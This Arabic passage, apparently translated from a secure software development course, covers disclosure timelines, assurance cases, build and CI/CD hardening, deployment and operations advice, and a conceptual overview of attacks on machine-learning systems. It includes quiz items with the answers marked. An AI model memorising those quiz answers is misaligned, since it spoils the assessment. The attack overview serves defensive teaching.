فأنت تدعم كيفية استخدام هذه المنظمات لنقاط الضعف هذه لمهاجمة الآخرين ؛ يجب أن تكون واثقا من أنهم سيستخدمونها من أجل الخير.

من الآن فصاعدا ، سنفترض أنك تتبع *نموذج إفصاح منسق* مع إطار زمني محدود.

تختلف الحدود الزمنية المنسقة للإفصاح (المعروفة أيضا باسم *فترات الحظر*) اختلافا كبيرا. هذا الحد الزمني هو مقدار الوقت بين قيام المراسل بإبلاغ المورد عن الثغرة الأمنية وسيقوم المراسل بالكشف عنها من جانب واحد للجمهور. بشكل عام ، يدفع الموردون من أجل حدود زمنية أطول أو عدم وجود حدود زمنية ، غالبا لأن ذلك سيخفض تكاليفهم (ربما إلى لا شيء إذا تمكن المورد من تمديد المهلة الزمنية حتى لا يحتاج المورد أبدا إلى إصلاح الثغرة الأمنية). تميل المنظمات المكلفة بحماية الجمهور والمنظمات متعددة الأحزاب إلى الضغط من أجل حدود زمنية أقصر. بعض الثغرات الأمنية أسهل في الإصلاح من غيرها ، مما يجعل من الصعب اختيار الأرقام البسيطة. فيما يلي بعض الأمثلة على الحدود الزمنية للإفصاح العام:

* [توزيعات Linux](https://oss-security.openwall.org/wiki/mailing-lists/distros): يفضل أقل من 7 أيام ، ويسمح بما يصل إلى 14 يوما ، وما يصل إلى 19 يوما إذا كان تقرير الخميس / الجمعة والإفصاح يوم الاثنين / الثلاثاء

* [oCERT:](http://ocert.org/) 14 يوما قياسيا ؛ 7 أيام إذا كانت تافهة ، 30 يوما إذا كانت حرجة / معقدة ، حتى شهرين "استثنائية للغاية"

* [CERT / CC:](https://www.cert.org/vulnerability-analysis/vul-disclosure.cfm) 45 يوما "بغض النظر عن وجود ... من التصحيحات أو الحلول ... الظروف المخففة ... قد يؤدي إلى الكشف المبكر أو اللاحق ... لن نوزع مآثر"

* [مشروع Google Zero](https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html): 90 يوما.

#### مزيد من المعلومات

مصدر جيد لمزيد من المعلومات هو "[المبادئ التوجيهية والممارسات لتنسيق وكشف نقاط الضعف متعددة الأطراف](https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1)" من FIRST. تاريخيا ، ركزت العديد من الوثائق على التنسيق الثنائي البسيط بين الباحث الأمني ومورد البرمجيات ، ولكن اليوم غالبا ما تكون هناك تعقيدات بسبب الحاجة إلى التنسيق متعدد الأطراف. تناقش هذه الوثيقة الأولى هذه الحالات الأكثر تعقيدا ، وتوفر إرشادات لمعالجتها.

## متنوعه

### حالات الضمان

للأسف ، لا يمكنك فعل شيء واحد فقط وجعل النظام آمنا. بدلا من ذلك ، تحتاج إلى القيام بمجموعة متنوعة من الأشياء. يمكن أن يصبح تتبع التقنيات المختلفة التي تحتاج إلى القيام بها ، للتأكد من أنك تعالج حقا كل ما تعتقد أنه يجب عليك القيام به ، أمرا مربكا ... خاصة إذا كان برنامجك كبيرا أو كانت هناك توقعات بأمان قوي. بالإضافة إلى ذلك ، في بعض الأحيان يرغب أصحاب المصلحة المحتملون (مثل المستخدمين) في فهم ما تفعله من أجل تحديد ما إذا كنت تفعل ما يكفي لأغراضهم. إن القائمة غير المنظمة من "*الأشياء التي تم القيام بها*" لا تساعد حقا عندما يصبح النظام أكبر. قد تفعل أشياء كثيرة ، لكنك تفشل في معالجة شيء مهم.

البديل العملي هو إنشاء *حالة ضمان*. تتضمن حالة الضمان * "مطالبة عالية المستوى لممتلكات نظام أو منتج (أو مجموعة من المطالبات) ، والحجج المنهجية فيما يتعلق بهذه المطالبة ، والأدلة والافتراضات الصريحة التي تكمن وراء هذه الحجة" (*[ISO / IEC 15026-2: 2011](https://www.iso.org/standard/52926.html)). دعونا نلقي نظرة على هذا التعريف. بعبارة أخرى ، تتضمن حالة التأكيد ما يلي:

* المطالبة (المطالبات): مطالبة (مطالبات) المستوى الأعلى لخاصية نظام أو منتج. هذا هو ، شيء تريد أن يكون صحيحا.

* الحجج: حجة منهجية تبرر هذا الادعاء.

* الأدلة / الافتراضات: الأدلة والافتراضات الصريحة التي تقوم عليها الحجة.

الهدف من حالة الضمان هو أنها *منهجية*. بمعنى آخر ، يجب أن تبدأ بأي مطالبة (مطالبات) تريد تقديمها مهمة ، وتقسيمها بشكل متكرر لإظهار أن الادعاء صحيح. تخيل أنك محام تحاول رفع قضية إلى هيئة محلفين متشككة. مهمتك هي تبرير صحة الادعاء (الادعاءات). يساعدك إنشاء حالة ضمان على تحديد وتبرير الأشخاص بأن البرنامج آمن ، سواء للآخرين أو لنفسك.

لا يجب أن تكون حالة الضمان في أي شكل معين. ومع ذلك ، فهي غالبا ما تكون مستندات بها أشكال توضح الهيكل رفيع المستوى ، ونص يوفر التفاصيل. هذا ببساطة لأنه من السهل إلقاء نظرة على الأشكال لمعرفة كيفية عمل الأشياء معا ، لكن النص يوفر التفاصيل لفهم الأشياء حقا.

دعنا نتحدث عن طريقة واحدة لإنشاء حالة ضمان ، استنادا إلى مواد من [*نموذج حالة ضمان الأمان*](https://www.ida.org/-/media/feature/publications/a/as/a-sample-security-assurance-case-pattern/p-9278.ashx) بواسطة David A. Wheeler (2018). لنفترض أن لدينا مطالبة شاملة: نريد أن ندعي أن "نظامنا آمن بشكل كاف ضد التهديدات المعتدلة". دعنا نجادل أنه يمكننا تقديم دليل كاف على ذلك إذا تم تحديد متطلبات الأمان الخاصة بنا والوفاء بها من خلال وظائفها ، وأن الأمان يتم تنفيذه من خلال عمليات دورة حياة النظام. يمكننا تقسيم متطلبات الأمان بشكل أكبر إلى ثالوث متطلبات الأمان لدينا (السرية والنزاهة والتوافر) ، والتعامل بشكل صحيح مع التحكم في الوصول ، وتحديد ومعالجة الأصول والجهات الفاعلة في التهديد. فيما يلي شكل يوضح المستوى الأعلى لحالة الضمان:

![نص بديل للصورة](top_assurance_case.png)

**عينة من المستوى الأعلى لحالة ضمان **، بقلم ديفيد أ. ويلر (2018)

يمكننا بعد ذلك تقسيم كل عنصر بشكل متكرر. على سبيل المثال ، قد نقسم عمليات دورة الحياة إلى مجالات مثل التصميم والتنفيذ والتحقق. يمكننا بعد ذلك شرح كيفية تعاملنا مع الأمن في كل منها:

* بالنسبة للتصميم ، قد نظهر أننا اتبعنا جميع مبادئ تصميم Saltzer & Schroeder (S &S) التي ناقشناها بالفعل.

* للتنفيذ ، قد نظهر أننا واجهنا جميع نقاط الضعف "الرئيسية" التي حددتها بعض قوائم نقاط الضعف الرئيسية المقبولة على نطاق واسع وذات الصلة.

* للتحقق ، قد نظهر أننا نستخدم مجموعة متنوعة من الأدوات لاكتشاف الثغرات الأمنية قبل إصدار البرنامج.

للحصول على مناقشة مفصلة وقالب لإنشاء حالة ضمان ، راجع [*نموذج لنمط حالة ضمان الأمان*](https://www.ida.org/-/media/feature/publications/a/as/a-sample-security-assurance-case-pattern/p-9278.ashx) بواسطة David A. Wheeler (2018). إذا كنت ترغب في رؤية مثال فعلي، يمكنك الاطلاع على [حالة ضمان OpenSSF Best Practices BadgeApp](https://github.com/coreinfrastructure/best-practices-badge/blob/master/doc/security.md).

متى تنتهي؟ الجواب المعتاد هو عندما يتفق أصحاب المصلحة على أنه يكفي. إذا كانوا لا يعتقدون أن هذا يكفي ، فاسألهم عما سيكون كافيا وما إذا كانوا على استعداد لدفع ثمن هذه التغييرات. إذا لم يدفعوا لك ما يكفي ، فلن تحتاج إلى القيام بذلك.

ما هو عظيم في حالة الضمان هو أنه إذا أراد شخص ما لاحقا معرفة "هل هذا البرنامج آمن بشكل كاف" ، فيمكنه ببساطة مراجعة حالة الضمان. إن مجرد *وجود* حالة ضمان يوفر الكثير من الثقة ، لأنه يظهر أن شخصا ما فكر في ما يفترض أن يفعله النظام ولديه حجة معقولة (مع دليل) بأن الادعاءات صحيحة.

#### اختبار 4.2: حالات التأكيد

\>\>حدد العبارة (العبارات) الحقيقية:<<

[!x] تصف المطالبة خاصية مهمة تريد أن تكون صحيحة لنظام أو منتج

[x] يجب أن تفصل حالة التأكيد المطالبة بشكل متكرر حتى تتمكن من إثبات صحتها من خلال إظهار أن كل جزء صحيح.

[x] من حيث المبدأ، يتم البحث في حالة الضمان بشكل متكرر حتى يتفق أصحاب المصلحة على أنه تم القيام بما يكفي (على سبيل المثال، لأنهم غير مستعدين لدفع المزيد).

### تقوية بيئة التطوير (بما في ذلك البناء وخط أنابيب CI / CD) وبيئة التوزيع

تحدث معظم الهجمات عندما يتم نشر نظام ، ولكن المهاجمين يهاجمون الأنظمة بشكل متزايد أثناء تطويرها وتوزيعها. لأغراضنا ، تتضمن "بيئة التطوير" مجموعة من جميع الأجهزة والبنية التحتية الأخرى المستخدمة لتطوير البرنامج ، بما في ذلك أنظمة كل مطور ، ونظام (أنظمة) التحكم في الإصدار ، وأنظمة البناء ، وخطوط أنابيب CI / CD ، وما إلى ذلك.  "بيئة التوزيع" هي البيئة المستخدمة لتوزيع البرامج المبنية الناتجة ، على سبيل المثال ، سجلات / مستودعات الحزم ، وسجلات / مستودعات الحاويات ، وما إلى ذلك. من المهم تأمين بيئة التطوير وبيئة التوزيع ضد الوصول غير المصرح به أو الاختراق. وهذا يشمل حمايتهم من إدخال تعليمات برمجية ضارة. افترض أن المهاجمين يحاولون تخريب أي نظام مستخدم لتطوير البرامج أو توزيعها ، وخاصة أي أنظمة مشتركة.

أولا ، تقليل الامتيازات. حدد من يمكنه التحكم في هذه البيئات ، وبأي مقدار. إذا غادر شخص ما مشروعا و / أو مؤسسة ، فقم بإزالة امتيازاته ؛ حتى لو لم يهاجموا ، فقد يحصل المهاجم على بيانات اعتماده. الحد من الامتيازات الممنوحة للبيئات ، على سبيل المثال ، إذا تم منح خط أنابيب CI / CD رمزا مميزا للمصادقة ، فقم بتوفير رمز مميز مع الحد الأدنى من الامتيازات اللازمة بحيث إذا تم الكشف عن الرمز المميز ، يتم تقليل الضرر. إذا كانت هناك حاجة إلى رمز مميز فقط في بعض الحالات (مثل فقط عند معالجة فروع معينة مثل "main") ، فقم بتوفير الرمز المميز فقط في تلك الحالات.

تتمثل إحدى الطرق البسيطة في جعل المطورين يستخدمون الرموز المميزة للمصادقة متعددة العوامل (MFA) (المعروفة أيضا باسم المفاتيح) عند الوصول إلى بيئات التطوير. هذه هي الأجهزة التي تثبت أن المطور يمتلك الجهاز ، وبما أنها أحادية الغرض ، فمن الصعب على المهاجمين تخريبها. إذا كان يجب عليك استخدام كلمات المرور ، فتأكد من أنها طويلة وغير مشتركة بين الأشخاص.

ضع في اعتبارك استخدام "حماية الفرع" أو ما شابه ذلك ، إذا كان نظام التحكم في الإصدار الخاص بك يدعمها ، لتقييد العمليات التي يمكن أن تحدث في فروع معينة (مثل "الرئيسية"). على سبيل المثال، يمكنك التأكد من أن طلب الدمج/طلب السحب قد تلقى مراجعة بشرية وأنه اجتاز عمليات التحقق التلقائية قبل قبول التغيير المقترح. يمكن للفروع المحمية أيضا منع العمليات الخطرة مثل دفع القوة ، والكتابة فوق تاريخ الالتزام ، والتغييرات المماثلة.

حيثما كان ذلك عمليا ، قم بتقوية بيئة التطوير وبيئة التوزيع بحيث يصعب مهاجمتها. في العديد من المشاريع ، يتم استضافة العديد من أو كل أجزاء هذه البيئات في مكان آخر (غالبا في سحابة) ؛ تأكد من أن نظام الاستضافة الذي تختاره يتمتع بأمان كاف. بمجرد الاختيار ، راجع الوثائق الخاصة بالأنظمة التي تستخدمها وقم بتكوينها لتحقيق أقصى قدر من الأمان ، على سبيل المثال ، لتقليل الامتيازات الممنوحة للآخرين. على سبيل المثال، إذا كنت تستخدم GitHub، فراجع [وثائق GitHub حول تأمين مستودعك](https://docs.github.com/en/code-security/getting-started/securing-your-repository). إذا كان لديك تثبيت [ GitLab، فراجع وثائق GitLab حول تأمين التثبيت ("الأمان")](https://docs.gitlab.com/ee/security/).

يجب أن تكون عملية الإنشاء مكتوبة / مؤتمتة بالكامل. بهذه الطريقة سيتم تنفيذ عمليات البناء بشكل متوقع في كل مرة. حيثما أمكن ، يجب أن يوفر نظام الإنشاء معلومات المصدر ، أي تسجيل المكونات التي تم تضمينها في البناء ومن الناحية المثالية المكونات التي تم استخدامها لأداء البناء. كن حذرا عند تسجيل عملية بناء ؛ غالبا ما تريد تجنب تسجيل أي أسرار في ملفات السجل مثل رموز المصادقة النشطة.

غالبا ما تجلب عمليات البناء والتحقق والتوزيع (بما في ذلك خطوط أنابيب CI / CD) العديد من مكونات البرامج الأخرى القابلة لإعادة الاستخدام. تأكد من تطبيق الممارسات الجيدة التي تمت مناقشتها في أقسام الدورة التدريبية حول (1[) اختيار (تقييم) البرامج مفتوحة المصدر](#selecting-evaluating-open-source-software) و (2) [تنزيل البرامج القابلة لإعادة الاستخدام وتثبيتها](#downloading-and-installing-reusable-software).

مستويات سلسلة التوريد لأدوات البرامج ، أو SLSA ("salsa") ، هي إطار أمان يتم تطويره كقائمة مرجعية للمعايير والضوابط لمنع العبث وتحسين السلامة وتأمين الحزم والبنية التحتية. في وقت كتابة هذا التقرير ، لا يزال قيد التطوير ، ولكن يجب عليك التفكير في توصياته. يتم تطوير SLSA في إطار مؤسسة أمن المصدر المفتوح (OpenSSF). لمعرفة المزيد، راجع الصفحة الرئيسية ل SLSA على <https://slsa.dev/>.

مصدر آخر للأفكار الجيدة حول تقوية بيئات التطوير ضد الهجوم ، بالإضافة إلى العديد من الأساليب الأخرى لتحسين الأمان ، موجود في [أفضل ممارسات سلسلة توريد البرمجيات](https://github.com/cncf/tag-security/raw/main/supply-chain-security/supply-chain-security-paper/CNCF_SSCP_v1.pdf) من مؤسسة الحوسبة السحابية الأصلية (CNCF).

إذا تمكن المهاجم من تخريب عملية الإنشاء ، فغالبا ما يصعب اكتشاف النتائج المخربة. الإجراء المضاد القوي لهذا الهجوم هو بناء قابل للتكرار تم التحقق منه. البناء قابل للتكرار "إذا تم إعطاؤه نفس التعليمات البرمجية المصدر وبيئة البناء وتعليمات الإنشاء ، يمكن لأي طرف إعادة إنشاء نسخ متطابقة شيئا فشيئا من جميع القطع الأثرية المحددة" (كما هو محدد في  "[التعريفات" من مشروع Reproducible Builds](https://reproducible-builds.org/docs/definition/)). يطلق على البناء القابل للتكرار أيضا اسم البناء الحتمي. البنية القابلة للتكرار التي تم التحقق منها هي ببساطة بنية تم التحقق منها بشكل مستقل لتكون بنية قابلة للتكرار (على جهاز (أجهزة) مختلفة). تجعل البنيات القابلة للتكرار التي تم التحقق منها مهاجمة عملية الإنشاء أكثر صعوبة ، لأنه يجب على المهاجم بعد ذلك تخريب أنظمة بناء مستقلة متعددة لتخريب بناء البرنامج بنجاح.

العديد من البنيات قابلة للتكرار دون أي تغييرات ، ومع ذلك ، فإن بعضها ليس كذلك. غالبا ما تكون الخطوة الأولى في إنشاء بنية قابلة للتكرار هي التحقق من أنه إذا قمت بنفس البناء مرتين على نظام sam ، فإنه ينتج نفس النتيجة (بنية قابلة *للتكرار* ). يمكن أن يساعد استخدام صورة حاوية (مثل صورة Docker) أو صورة افتراضية للبيئة في إنشاء بيئة متسقة لتنفيذ عمليات بناء قابلة للتكرار. فيما يلي بعض التحديات الشائعة في إنشاء إصدارات قابلة للتكرار:

* قد تتضمن نتيجة الإنشاء طوابع التاريخ / الوقت. إذا لم يكن بالإمكان إزالتها بسهولة ، فإن الحل الشائع هو استخدام التعديل الأخير لشيء ما (عادة شفرة المصدر) لتعيين التاريخ / الطوابع الزمنية في أي نتيجة (باستخدام آليات مثل `SOURCE_DATE_EPOCH` متغير البيئة).
* يمكن أن تكون بعض القيم بترتيب "تعسفي" (على سبيل المثال ، بسبب التنفيذ المتوازي). الحل الشائع هو فرز النتائج (على سبيل المثال ، معجميا).

يتوفر مزيد من المعلومات حول كيفية إنشاء بنيات قابلة للتكرار ؛ راجع [ "الوثائق" من مشروع البنيات القابلة للتكرار](https://reproducible-builds.org/docs/).

>  وقت القصة: تخريب نظام بناء سولار ويندز أوريون

> Orion عبارة عن مجموعة برامج لإدارة شبكات المؤسسات من SolarWinds تتضمن مراقبة الأداء والتطبيقات بالإضافة إلى إدارة تكوين الشبكة. في عام 2020 ، قام ممثل تهديد بتعديل نظام بناء Orion بحيث تتضمن الإصدارات المبنية من Orion تعليمات برمجية ضارة. ثم تم توقيع هذا النظام المبني المدمر بواسطة شهادة توقيع كود SolarWinds الشرعية. كان هذا التخريب ضارا للغاية. حتى أن وكالة الأمن السيبراني وأمن البنية التحتية (CISA) التابعة للحكومة الأمريكية أصدرت توجيها طارئا ("[توجيه الطوارئ 21-01]] (<https://www.cisa.gov/emergency-directive-21-01>)" من CISA). لا يمكن أن تعمل العديد من الإجراءات الأمنية المضادة في هذه الحالة. لم ينجح "رمز المراجعة" (تم إدراج التغيير بواسطة نظام الإنشاء وبالتالي لم يراه مطوروه) ، ولم يعمل "التحقق من التوقيعات" (تم توقيعه بشكل شرعي) ، ولم تنجح مراقبة المشكلات لفترة من الوقت (لأنه في العديد من المنظمات كان هذا هو نظام المراقبة). لمزيد من المعلومات، راجع [التنبيه AA20-352A](https://www.cisa.gov/emergency-directive-21-01) من CISA و[ "منع هجمات سلسلة التوريد مثل SolarWinds](https://linuxfoundation.org/blog/preventing-supply-chain-attacks-like-solarwinds/)" بقلم David A. Wheeler.

 يعد تقوية خط أنابيب CI / CD ضد الوصول غير المصرح به أو التعليمات البرمجية الضارة أو اختراق النظام جزءا من 2021 OWASP Top 10 # 8 (A08: 2021) ، *فشل سلامة البرامج والبيانات*.

### التوزيع والميدان / النشر والعمليات والتخلص

لا توجد دورة يمكن أن تعلم كل شيء. يركز هذا المساق على *تطوير* برامج آمنة ، بما في ذلك توزيعها. لم نركز عمدا على العمليات بعد التطوير ، بما في ذلك التوزيع والميدان (النشر) والعمليات والتخلص من البرامج. أحد الأسباب هو أن هناك بالفعل العديد من المستندات والإرشادات التي تحاول مساعدة الأشخاص على القيام بذلك بشكل آمن ، ولكن هذه الجهود تعوقها لأنهم يحاولون التلاعب بمقابض التكوين لتحويل البرامج غير الآمنة إلى برامج آمنة. بشكل عام ، يكون أكثر فاعلية ، إذا كنت تريد نظاما آمنا ، أن تبدأ ببرنامج آمن.

بطبيعة الحال ، فإن التوزيع والنشر والعمليات والتخلص كلها مهمة. تطبق العديد من المشاريع نهج DevOps أو DevSecOps ، والذي يمزج هذه العمليات عن قصد مع التطوير. حتى إذا تم التطوير من قبل مجموعة مختلفة ، فإن وجود توزيع آمن وميداني وعمليات والتخلص أمر بالغ الأهمية للبرامج لتكون آمنة في العالم الحقيقي. لذلك في حين أن هذه الدورة لا تركز على هذه العمليات ، فإليك بعض النصائح حول هذه العمليات التي قد تساعدك.

عند التوزيع:

* استخدم HTTPS (TLS) ، بحيث يمكن للأشخاص التحقق من أنه المجال المقصود ولا يمكن معالجة المعلومات بين الخادم والمستلم.

* حيثما كان ذلك عمليا ، قم بتوقيع المعلومات الموزعة باستخدام مفتاح خاص *غير* متوفر للخادم الذي يقوم بتوزيع البرنامج. من الناحية المثالية ، يجب توقيع إصدارات البرامج بواسطة مفتاح خاص لا يتوفر أبدا على الإنترنت. يتيح ذلك التحقق الخارجي (باستخدام المفتاح العام المقابل) حتى إذا تم اختراق الخادم. لسوء الحظ ، يتطلب هذا ضمان توزيع المفاتيح العامة بشكل آمن على أجهزة الاستقبال. في بعض الحالات ، قد يكون التأكد من أن أجهزة الاستقبال لديها المفاتيح العامة الصحيحة مشكلة صعبة ، بينما يكون ذلك سهلا في حالات أخرى. الحل الشائع لتحديثات البرامج هو قبول تحديث إذا تم توقيعه بواسطة نفس المفتاح الذي وقع الإصدار المثبت حاليا من البرنامج. يعمل مشروع sigstore على تطوير طرق أسهل للتوقيع والتحقق من القطع الأثرية البرمجية. لمزيد من المعلومات، راجع <https://www.sigstore.dev/>.

* إذا كنت تقوم بتوزيع تطبيق، فقم بالترتيب لتحديثه افتراضيا (على الرغم من السماح للمستخدم بتجاوز هذا). غالبا ما لا يقوم المستخدمون بالتحديث ما لم يكن تلقائيا. هناك خطر من أن يقوم أحد المهاجمين بتخريب عملية الإنشاء أو التوزيع الخاصة بك ، لذا قم بحماية هذه العمليات وتأكد من قبول التحديثات فقط إذا تم توقيعها بواسطة مفتاح خاص غير متصل بالإنترنت مطلقا.

لاحظ أن مناقشتنا السابقة حول اقتناء البرامج ناقشت مشاكل التوزيع من الجانب الآخر. أي عند الحصول على برنامج تريد التأكد من حصولك على ما كان من المفترض أن تتلقاه ، وعند توزيع البرامج ، فأنت تريد أن تسهل على المستلمين التحقق من ذلك.

مرة أخرى ، ضع في اعتبارك توصيات مستويات سلسلة التوريد لأدوات البرامج ، أو SLSA ("salsa") ، في <https://slsa.dev/>.

عند إيفاد / نشر:

* قم بتكوين بيئة الإنتاج الخاصة بك لتكون آمنة، بما في ذلك جميع المكونات التي تعتمد عليها، وحافظ على تحديثها. على سبيل المثال:

  * يجب تكوين بيئتك لتوفير أقل امتياز واستخدام أقصى إعدادات الأمان التي يسمح بها نظامك.

  * احذر من  "*التكوينات الافتراضية غير الآمنة ، والتكوينات غير المكتملة أو المخصصة ، والتخزين السحابي المفتوح ، ورؤوس HTTP التي تم تكوينها بشكل خاطئ ، ورسائل الخطأ المطولة التي تحتوي على معلومات حساسة"* (كما يلاحظ OWASP).

  * قم بتقوية بيئتك من خلال تمكين الإجراءات المضادة للأمان إلى أقصى حد والقضاء على المكونات غير المستخدمة (بحيث لا يمكن استغلال نقاط الضعف الخاصة بها). تتضمن هذه المكونات أنظمة التشغيل وأنظمة قواعد البيانات وشاشة الجهاز الظاهري والأجهزة الظاهرية والبنية الأساسية لوقت تشغيل الحاوية والحاويات وأي شيء آخر تستخدمه أو تعتمد عليه. هناك العديد من الوثائق التي تناقش كيفية تقوية المكونات المختلفة ؛ استخدمها!

  * حيثما كان ذلك معقولا ، قم بتمكين التحديثات التلقائية.

* تجنب منح حق الوصول المباشر إلى قاعدة البيانات الخاصة بك ما لم يكن ذلك ضروريا *وقمت* بالتحقق من أنها آمنة.

* تأكد من أن جميع مجموعات البيانات لها * امتياز محدود*. على وجه الخصوص، إذا كنت تستخدم حاويات AWS S3 للبيانات غير العامة، فتأكد من أن وصولها محدود للغاية (تم جعل العديد من حاويات S3 التي تحتوي على بيانات غير عامة قابلة للقراءة بشكل عام).

* حيثما يكون ذلك منطقيا ، قم بتمكين تشفير القرص بالكامل و / أو تشفير قاعدة البيانات.

* قم بتمكين أنظمة المراقبة التي ستحذرك ، أو تقوم بتحديثها تلقائيا ، عندما يكون للمكون قيد الاستخدام ثغرة أمنية معروفة.

* قم بتشغيل التسجيل وإعادة توجيهه إلى موقع مركزي محمي للمراقبة. تمكين الأنظمة الآلية من اكتشاف المشكلات الأمنية المحتملة والتحذير منها.

عند التشغيل:

* قم بتحديث المكونات في الوقت المناسب (وهذا ما يسمى أحيانا *إدارة التصحيح والثغرات الأمنية*). في بعض المؤسسات، يتم تقسيم هذه الوظيفة بين المطورين الذين يقومون بتحديث المكونات داخل التطبيق والمشغلين الذين يقومون بتحديث المكونات الخارجية التي يعتمد عليها التطبيق. بغض النظر عن كيفية القيام بذلك ، يجب تحديث المكونات في الوقت المناسب أو سيتمكن المهاجم من استغلالها.

* افحص التحذيرات و / أو السجلات بشكل روتيني. تحديد أي منها هي مؤشرات على حادث.

* الاستجابة في الوقت المناسب للحوادث.

* بمجرد حل ثغرة أمنية أو حادث ، استخدم تحليل السبب الجذري لمعرفة *سبب حدوثه* حتى يمكن إجراء تغييرات لمنع تكرار مماثل.

* قم بإنشاء نسخ احتياطية وتخزينها بشكل آمن (يحب المهاجمون الحصول على نسخ من النسخ الاحتياطية). اختبار للتأكد من أنه يمكنك التعافي منها. تأكد من أن لديك نسخا احتياطية ("باردة") في وضع عدم الاتصال لمواجهة برامج الفدية (التي تقتحم بياناتك وتشفر بياناتك وتحتفظ بها للحصول على فدية).

* عندما تتلقى تقريرا عن ثغرة أمنية ، قم بمعالجته وإصلاحه في الوقت المناسب. ثم امنح المراسل ائتمانا عاما ما لم يطلب المراسل خلاف ذلك.

عند التخلص ، تأكد من تدمير أي بيانات من المفترض أن تدمرها بالكامل. مجرد إزالة ملف لا يؤدي في الواقع إلى إزالة محتوياته من معظم أجهزة التخزين.

 يعد التكوين الخاطئ للأمان خطأ شائعا في تطبيقات الويب لدرجة أنه 2017 OWASP Top 10 # 6 و 2021 OWASP Top 10 # 5.  تعتبر حماية وظائف التحديث التلقائي جزءا من 2021 OWASP Top 10 # 8 (A08: 2021) ، *فشل سلامة البرامج والبيانات*. يعد استخدام المكونات ذات الثغرات الأمنية المعروفة نقطة ضعف شائعة في تطبيق الويب لدرجة أنه 2017 OWASP Top 10 # 9. استخدام المكونات الضعيفة والقديمة هو 2021 OWASP Top 10 # 6. *فشل تسجيل ومراقبة الأمان* هو 2021 OWASP Top 10 # 9. * عدم كفاية التسجيل والمراقبة* هو 2017 OWASP Top 10 # 10.

#### اختبار 4.3: التوزيع ، الميدان / النشر ، العمليات ، والتخلص

\>\>حدد العبارة (العبارات) الحقيقية:<<

[!x] لا تمنح حق الوصول المباشر إلى نظام قاعدة البيانات الخاص بك إلا إذا كان ذلك ضروريا *وتحققت* من أنه آمن.

[x] في العمليات، قم بتشغيل التسجيل وإعادة توجيه تسجيل السجل إلى موقع مركزي محمي للمراقبة.

[ ] قم بإصلاح أي مشكلة أمنية بسرعة ، ثم انتقل إلى مشكلات أخرى. {{ محدد: لا، بعد إصلاح مشكلة أمنية (حادث)، يجب أن تحاول أيضا معرفة *سبب* حدوثها ("تحليل السبب الجذري") حتى تتمكن من إصلاح السبب الأساسي. خلاف ذلك ، هناك فرصة جيدة لاستمرار حدوث مشاكل مماثلة. }}

### الذكاء الاصطناعي (الذكاء الاصطناعي) والتعلم الآلي (ML) والأمن

الذكاء الاصطناعي (الذكاء الاصطناعي) هو الذكاء الذي تظهره الآلات
(يسمى ذكاء البشر أحيانا الذكاء الطبيعي).
التعلم الآلي (ML) هو مجال تحقيق مخصص ل
فهم وبناء الأساليب التي "تتعلم" ، أي ،
الأساليب التي تستفيد من البيانات لتحسين الأداء في مجموعة من المهام
(*التعلم الآلي *، توم ميتشل).
غالبا ما يعتبر ML مجموعة فرعية من الذكاء الاصطناعي.
يركز قدر كبير من العمل الأمني الذكاء الاصطناعي اليوم على ML.
سنأخذ نفس التركيز هنا.

غالبا ما يتضمن بناء أنظمة ML عدة عمليات ، وهي
التدريب والاختبار والاستدلال. الاستدلال هو عندما يتم تشغيل نظام ML
المستخدمة من قبل مستخدميها.
افترضت العديد من مشاريع التعلم الآلي بيئة مغلقة وموثوقة حيث
لا توجد تهديدات أمنية.
ومع ذلك ، فإن هذا الافتراض غالبا ما يكون غير واقعي.

*التعلم الآلي العدائي* هو مجموعة من الجهود المبذولة ل
حماية خط أنابيب ML لضمان أمنه أثناء التدريب ،
الاختبار والاستدلال.
هذا مجال نشط للدراسة ، وتختلف المصطلحات.
ومع ذلك ، هناك العديد من أنواع الهجمات المحتملة على أنظمة ML ، بما في ذلك:

* *التهرب* ("افعل / استنتج الشيء الخطأ").
  في هجوم التهرب ، يوفر المهاجم إدخالا معدلا إلى
  مصنف نظام ML أثناء الاستدلال لذلك يتم تصنيفه بشكل خاطئ
  مع الحفاظ على التعديل صغيرا قدر الإمكان
  (نيكولاي وآخرون ، 2019).
  على سبيل المثال، قد ينشئ المهاجم علامات دقيقة في الطريق إلى
  أقنع سيارة ذاتية القيادة بالانحراف بشكل غير متوقع إلى حركة المرور القادمة.
  تسمى هذه المدخلات المعدلة أحيانا *مدخلات الخصومة*.
  يمكن أن تمكن المدخلات العدائية المهاجم من التحكم في النظام اعتمادا على
  المصنف.
  وبالتالي ، قد يؤدي هذا النوع من الهجوم إلى فقدان النزاهة و / أو التوافر.
* *التسمم* ("تعلم الشيء الخطأ").
  في هجوم التسميم ، يتلاعب المهاجم بالبيانات التي سيتم استخدامها ك
  بيانات التدريب ، على سبيل المثال ، لتقليل الأداء ، والتسبب في سوء التصنيف ، و / أو
  إدراج الأبواب الخلفية
  (نيكولاي وآخرون ، 2019).
  تحتاج أنظمة ML عادة إلى كمية كبيرة من بيانات التدريب.
  قد يقوم بعض المهاجمين بإنشاء أو التلاعب بالمعلومات المتاحة للجمهور
  البيانات إذا كان من المحتمل أن تستخدم في نهاية المطاف للتدريب.
  قد يؤدي هذا النوع من الهجوم إلى فقدان النزاهة و / أو التوافر.
* *فقدان السرية* ("الكشف عن الشيء الخطأ").
  قد يتمكن المهاجم من استخدام نتائج الاستعلام للكشف عن المعلومات المخفية.
  وبالتالي ، قد يؤدي هذا النوع من الهجوم إلى فقدان السرية.
  يمكن تقسيم هذا النوع من الهجوم بشكل أكبر ، على سبيل المثال:
  * *الاستخراج*.
      في هجوم الاستخراج ، يستخرج المهاجم المعلمات أو
      هيكل النموذج من ملاحظات تنبؤات النموذج
      (طباسي 2019).
  * *(العضوية) الاستدلال.*
      في هجوم استدلال العضوية، المهاجم
      يستخدم نتائج استعلام النموذج الهدف لتحديد ما إذا كانت محددة
      تنتمي نقاط البيانات إلى نفس توزيع مجموعة بيانات التدريب
      (طباسي 2019).
  * *(نموذج) انعكاس*.
      في هجوم الانعكاس ، يكون المهاجم قادرا على
      إعادة بناء (بعض) البيانات المستخدمة لتدريب النموذج ، بما في ذلك
      البيانات الخاصة و / أو السرية (Tabassi 2019).

(الائتمان: الأوصاف البسيطة الموضحة أعلاه بين قوسين وعلامات اقتباس مزدوجة
صاغها الدكتور جيف ألستوت.)

ركز العمل بشكل خاص على مكافحة التهرب
(المدخلات العدائية) في أنظمة ML.
لسوء الحظ ، فإن العديد من الأساليب التي *يبدو أنها* تواجه التهرب تفشل في
مواجهة المهاجمين غير الساذجين.
فيما يلي بعض الأمثلة على الأساليب التي لا تتصدى للمهاجمين المحددين:

